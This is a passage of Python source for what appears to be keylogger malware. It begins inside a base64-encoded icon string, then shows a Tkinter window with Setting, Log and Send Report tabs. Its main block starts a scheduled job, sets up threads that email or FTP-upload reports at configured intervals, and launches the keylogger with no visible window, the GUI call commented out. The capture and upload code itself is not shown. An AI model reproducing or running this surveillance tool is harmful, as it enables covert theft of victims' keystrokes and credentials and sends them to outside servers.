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'
        self.root.iconphoto(False, ImageTk.PhotoImage(Image.open(io.BytesIO(base64.b64decode(icon)))))
        self.root.resizable(False, False)
        tab_control = ttk.Notebook(self.root)

        tab_1 = ttk.Frame(tab_control)
        tab_2 = ttk.Frame(tab_control)
        tab_3 = ttk.Frame(tab_control)

        Setting(self.root, tab_1)
        Log(tab_2)
        SendReport(tab_3)

        tab_control.add(tab_1, text='Setting')
        tab_control.add(tab_2, text='Log')
        tab_control.add(tab_3, text='Send Report')
        tab_control.grid()

        self.root.wm_protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.mainloop()

    def on_close(self):
        c.stop()
        self.root.quit()
        self.root.destroy()
        raise SystemExit
  
if __name__ == '__main__':
    BasicFunction().spawn()
    Config()
    c = CronJob()
    #run at startup
    if str(Config().email_interval_1) == '1':
        threading.Thread(target=Tools().send_email_1)
    if str(Config().email_interval_2) == '1':
        threading.Thread(target=Tools().send_email_2)
    if str(Config().ftp_interval_1) == '1':
        threading.Thread(target=Tools().upload_ftp_1)
    if str(Config().ftp_interval_2) == '1':
        threading.Thread(target=Tools().upload_ftp_2)
    #GUI() #draw app, replace this with keylogger to run gui-less first
    Keylogger()
